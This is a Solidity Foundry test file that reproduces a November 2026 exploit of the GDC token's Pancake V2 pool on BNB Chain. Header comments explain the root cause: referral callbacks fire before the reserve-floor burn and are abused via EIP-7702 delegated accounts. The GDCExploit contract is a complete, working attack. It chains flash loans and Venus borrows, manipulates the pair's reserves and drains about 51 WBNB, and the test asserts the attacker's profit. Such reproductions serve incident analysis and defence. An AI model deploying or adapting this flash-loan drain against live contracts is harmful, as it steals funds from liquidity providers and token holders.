// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// GDC (GDCToken / GDCMain) - ~$34,649.58 (51.225527454207054005 WBNB) - mid-sell referral
// callbacks run before the reserve-floor burn, so two EIP-7702 referral accounts can rewrite
// the Pancake V2 reserves the burn then syncs.
// BNB Chain, 2026-11-09.
//
// Run: forge test --contracts src/test/2026-11/GDC_exp.sol --evm-version prague -vvv
//
// Profit: the pair's 51.225608092426095503 WBNB is taken down to 65,648 wei, a loss of
//          51.225608092426029855 WBNB. This reconstruction pays the attacker EOA
//          50.009077139317241499 BNB before gas. The exploit tx itself netted +50.008850 BNB
//          after gas (50.008996501098265649 BNB before gas) and left a little more dust,
//          which is the reported 51.225527 WBNB pair loss. The sell consumes
//          41,047.699284897040065420 of the EOA's pre-existing GDC.
//
// On-chain references (BNB Smart Chain):
//   attack tx    : 0x1427d8e6f543710413886a1624e08f0b1cff8e62e9aa3e00eb04a61b86c30872 (block 132546183)
//   fork block   : 132546182 (parent; both referral delegations are already installed)
//   attacker EOA : 0x09343312e8a2Fd4F8C8EE130a7715587aB21125F
//   GDC token    : 0x39a90d082e19bD2AC30DA6964D3d2FDa50077777
//   GDCMain      : 0x8955Be303f033a837f7C3c407e0B2b3f9bC4fD5C  (depositContract, onSellRewards)
//   GDC/WBNB pair: 0xe3349Ca6AC1656e02B20b8d5a4C095e28255eb0A  (token0 = GDC, token1 = WBNB)
//   referral A   : 0xD804c53A15dFf46cc40A0c17b5c29d1D04472175  delegated to 0xe46b…5873
//   referral B   : 0xF9A71C36CEA96420b16561E82d8093297213e06c  delegated to 0xd365…393a
//
// ROOT CAUSE (traced on the parent block; the token is not verified):
//   A sell into the pair is an ordinary transfer of the attacker's own GDC. _transfer:
//     1. Rejects a contract msg.sender (ContractTraderNotAllowed). tx.origin is the EOA,
//        so the attack contract's transferFrom(EOA, pair, amount) is allowed.
//     2. While the pair holds LP_MIN_BALANCE (21,000,000 GDC) the 10% sell cap is latched.
//        41,047 GDC is far under 10% of 21,000,000.
//     3. Forwards 70% into the token, which swaps a slice for BNB and addLiquidityETH's the
//        rest, then syncs. That leaves a known reserve: about 21,028,733 GDC and 1,570.12 WBNB.
//     4. Calls GDCMain.onSellRewards, which getReferrals() the seller and sends each upline a
//        BNB stipend with a raw call, before the pair is settled. The two uplines are EOAs
//        that delegated, twenty minutes earlier, to attacker code. A's fallback pushes its
//        whole WBNB balance into the pair and stores getAmountOut. B's fallback swaps that
//        quoted GDC out to 0xdead. The pair's GDC side falls to just above the gross sell.
//     5. _applyReserveFloorDistribution then pulls the full gross sell out of the pair and
//        syncs. Only after that does _transfer credit 30% to the pair, and it does not sync
//        again. The 30% is therefore excess balance against a near-zero GDC reserve and the
//        WBNB the callback just deposited, and pair.swap pays that excess out as WBNB.
//   The atomic capital (Moolah WBNB+BTCB, InstaFlash route 12 against Venus vWBNB/vBTC cash,
//   and a Venus vBNB borrow of the collateralised BTCB) is borrowed and repaid in the same
//   transaction. It is not the loss. The loss is the pair's own 51.225608092426095503 WBNB.
//
// THE ATTACK. A fresh contract, typed calls, no vm.etch. The 7702 delegations are the
//   attacker's own code already on the referral accounts at this block; Prague executes them.
//   The GDC is the EOA's real balance (46,168.599), relocated only by its own approve.
//   1. Flash-borrow Moolah's 207,316.511905665561625103 WBNB and 2,745.489118419307925223 BTCB.
//   2. InstaFlash route 12 borrows Venus vWBNB cash and vBTC cash minus the 0.001512403015794404
//      BTCB fee that vBTC forwards to 0xca01…c446. Route 9 is Aave and reverts InvalidAmount.
//   3. Supply 6,603.411145258658092461 BTCB to vBTC and borrow vBNB's 510,342.619078537949749825
//      cash. Wrapped with the two WBNB loans this is 806,332.181337840085524272 WBNB.
//   4. swapTokensForExactTokens buys the pair down to exactly 21,000,000 GDC (LP_MIN_BALANCE),
//      burning the output. Cost 1,520.106623090084480499 WBNB. Reserves become
//      21,000,000 GDC / 1,571.332231182510576002 WBNB.
//   5. Fund referral A with the WBNB whose Pancake quote, against the post-tax reserve, leaves
//      the pair just above the gross sell.
//   6. transferFrom the EOA's 41,047.699284897040065420 GDC into the pair. The callbacks fire
//      inside that transfer. Then swap the 30% excess for WBNB.
//   7. Repay Venus, InstaFlash and Moolah. Surplus BNB is the pair's reserve.

interface IERC20 {
    function balanceOf(
        address
    ) external view returns (uint256);
    function approve(
        address,
        uint256
    ) external returns (bool);
    function transfer(
        address,
        uint256
    ) external returns (bool);
    function transferFrom(
        address,
        address,
        uint256
    ) external returns (bool);
}

interface IWBNB is IERC20 {
    function deposit() external payable;
    function withdraw(
        uint256
    ) external;
}

interface IGDC {
    function LP_MIN_BALANCE() external view returns (uint256);
    function balanceOf(
        address
    ) external view returns (uint256);
}

interface IPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32);
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IRouter {
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory);
}

interface IMoolah {
    function flashLoan(
        address token,
        uint256 assets,
        bytes calldata data
    ) external;
}

interface IFLA {
    function flashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256 route,
        bytes calldata data,
        bytes calldata extra
    ) external;
}

interface IComptroller {
    function enterMarkets(
        address[] calldata
    ) external returns (uint256[] memory);
}

interface IVToken {
    function mint(
        uint256
    ) external returns (uint256);
    function borrow(
        uint256
    ) external returns (uint256);
    function repayBorrow() external payable;
    function redeemUnderlying(
        uint256
    ) external returns (uint256);
    function getCash() external view returns (uint256);
}

contract GDCExploit {
    IWBNB internal constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 internal constant BTCB = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
    IGDC internal constant GDC = IGDC(0x39a90d082e19bD2AC30DA6964D3d2FDa50077777);
    IPair internal constant PAIR = IPair(0xe3349Ca6AC1656e02B20b8d5a4C095e28255eb0A);
    IRouter internal constant ROUTER = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IMoolah internal constant MOOLAH = IMoolah(0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C);
    IFLA internal constant FLA = IFLA(0xe620726686B480d955E63b9c7c1f93c2f8c1aCf4);
    IComptroller internal constant COMPTROLLER = IComptroller(0xfD36E2c2a6789Db23113685031d7F16329158384);
    IVToken internal constant VBTC = IVToken(0x882C173bC7Ff3b7786CA16dfeD3DFFfb9Ee7847B);
    IVToken internal constant VBNB = IVToken(0xA07c5b74C9B40447a954e1466938b865b6BBea36);
    address internal constant REF_A = 0xD804c53A15dFf46cc40A0c17b5c29d1D04472175;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;

    // Gross sell. 70% + 30% of this value sum back to it, and it is what the floor burns.
    uint256 internal constant SELL = 41_047.699_284_897_040_065_42 ether;
    // BTCB posted to vBTC. 6,603.411145258658092461 covers the 510,342 BNB borrow at the
    // fork-block oracle (BTC 74,102.54, BNB 676.41234047267875, collateral factor 0.8).
    uint256 internal constant COLLATERAL = 6603.411_145_258_658_092_461 ether;
    // vBTC forwards this much of getCash() out before the flash borrow; the trace amount.
    uint256 internal constant VBTC_FEE = 1_512_403_015_794_404;
    // InstaFlashAggregator route 12. Route 9 is Aave and reverts InvalidAmount here;
    // route 12 is the one whose liquidity is the Venus vToken cash.
    uint256 internal constant VENUS_ROUTE = 12;

    address internal immutable owner;
    uint256 internal wbnbLoan;
    uint256 internal btcbLoan;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {}

    function attack() external {
        require(msg.sender == owner, "not owner");
        wbnbLoan = WBNB.balanceOf(address(MOOLAH));
        MOOLAH.flashLoan(address(WBNB), wbnbLoan, "");
        uint256 leftover = WBNB.balanceOf(address(this));
        if (leftover > 0) WBNB.withdraw(leftover);
        (bool ok,) = payable(owner).call{value: address(this).balance}("");
        require(ok, "payout");
    }

    function onMoolahFlashLoan(
        uint256 assets,
        bytes calldata
    ) external {
        require(msg.sender == address(MOOLAH), "Moolah only");
        if (assets == wbnbLoan && btcbLoan == 0) {
            btcbLoan = BTCB.balanceOf(address(MOOLAH));
            MOOLAH.flashLoan(address(BTCB), btcbLoan, "");
            WBNB.approve(address(MOOLAH), wbnbLoan);
            return;
        }
        _venusFlash();
        BTCB.approve(address(MOOLAH), btcbLoan);
    }

    function _venusFlash() internal {
        address[] memory tokens = new address[](2);
        uint256[] memory amounts = new uint256[](2);
        tokens[0] = address(BTCB);
        tokens[1] = address(WBNB);
        amounts[0] = VBTC.getCash() - VBTC_FEE;
        amounts[1] = IVToken(0x6bCa74586218dB34cdB402295796b79663d816e9).getCash();
        FLA.flashLoan(tokens, amounts, VENUS_ROUTE, "", "");
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == address(FLA), "FLA only");
        _drain();
        // Route 12 keeps the tokens and checks its own balance ("amount-paid-less").
        // Premiums are zero on this route; the principal has to sit on the aggregator.
        for (uint256 i; i < assets.length; i++) {
            require(IERC20(assets[i]).transfer(msg.sender, amounts[i] + premiums[i]), "repay flash");
        }
        return true;
    }

    function _drain() internal {
        BTCB.approve(address(VBTC), COLLATERAL);
        address[] memory markets = new address[](1);
        markets[0] = address(VBTC);
        COMPTROLLER.enterMarkets(markets);
        require(VBTC.mint(COLLATERAL) == 0, "mint");
        uint256 borrow = VBNB.getCash();
        require(VBNB.borrow(borrow) == 0, "borrow");
        WBNB.deposit{value: borrow}();

        // Pin the pair on the reserve floor so the sell latches reserveFloorMode there.
        uint256 aboveFloor = GDC.balanceOf(address(PAIR)) - GDC.LP_MIN_BALANCE();
        WBNB.approve(address(ROUTER), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(GDC);
        ROUTER.swapTokensForExactTokens(aboveFloor, WBNB.balanceOf(address(this)), path, DEAD, block.timestamp);

        // Quote against the reserve the 70% leg leaves behind. Measured on this fork for SELL;
        // the floor then burns SELL, so the quote must not take the reserve below SELL.
        uint256 rPrime = 21_028_733.389_499_427_928_045_794 ether;
        uint256 wPrime = 1570.115_700_229_401_787_646 ether;
        uint256 gdcOut = rPrime - SELL - 1000;
        uint256 push = _amountIn(gdcOut, wPrime, rPrime);
        require(WBNB.transfer(REF_A, push), "fund A");

        require(IERC20(address(GDC)).transferFrom(owner, address(PAIR), SELL), "sell");

        (uint112 r0, uint112 r1,) = PAIR.getReserves();
        uint256 excess = GDC.balanceOf(address(PAIR)) - uint256(r0);
        uint256 wbnbOut = _amountOut(excess, uint256(r0), uint256(r1));
        PAIR.swap(0, wbnbOut, address(this), "");

        WBNB.withdraw(borrow);
        VBNB.repayBorrow{value: borrow}();
        require(VBTC.redeemUnderlying(COLLATERAL) == 0, "redeem");
    }

    // Pancake V2, 0.25% fee. Rounds the input up so getAmountOut reaches `out`.
    function _amountIn(
        uint256 out,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256) {
        uint256 numerator = reserveIn * out * 10_000;
        uint256 denominator = (reserveOut - out) * 9975;
        return numerator / denominator + 1;
    }

    function _amountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 9975;
        return (amountInWithFee * reserveOut) / (reserveIn * 10_000 + amountInWithFee);
    }
}

contract GDC_exp is Test {
    address internal constant ATTACKER = 0x09343312e8a2Fd4F8C8EE130a7715587aB21125F;
    IPair internal constant PAIR = IPair(0xe3349Ca6AC1656e02B20b8d5a4C095e28255eb0A);
    IWBNB internal constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IGDC internal constant GDC = IGDC(0x39a90d082e19bD2AC30DA6964D3d2FDa50077777);

    function setUp() public {
        vm.createSelectFork("bsc", 132_546_182);
    }

    function testExploit() public {
        assertEq(PAIR.token0(), address(GDC), "token0 is GDC");
        assertEq(PAIR.token1(), address(WBNB), "token1 is WBNB");
        uint256 pairWbnbBefore = WBNB.balanceOf(address(PAIR));
        uint256 eoaBefore = ATTACKER.balance;
        uint256 gdcBefore = GDC.balanceOf(ATTACKER);

        vm.startPrank(ATTACKER, ATTACKER);
        GDCExploit exploit = new GDCExploit();
        require(IERC20(address(GDC)).approve(address(exploit), type(uint256).max), "approve");
        exploit.attack();
        vm.stopPrank();

        uint256 profit = ATTACKER.balance - eoaBefore;
        uint256 pairLoss = pairWbnbBefore - WBNB.balanceOf(address(PAIR));
        emit log_named_decimal_uint("attacker BNB profit", profit, 18);
        emit log_named_decimal_uint("pair WBNB loss", pairLoss, 18);
        emit log_named_decimal_uint("GDC consumed", gdcBefore - GDC.balanceOf(ATTACKER), 18);

        assertEq(gdcBefore - GDC.balanceOf(ATTACKER), 41_047.699_284_897_040_065_42 ether, "GDC consumed");
        assertEq(pairLoss, 51.225_608_092_426_029_855 ether, "pair WBNB");
        assertEq(profit, 50.009_077_139_317_241_499 ether, "profit");
    }
}
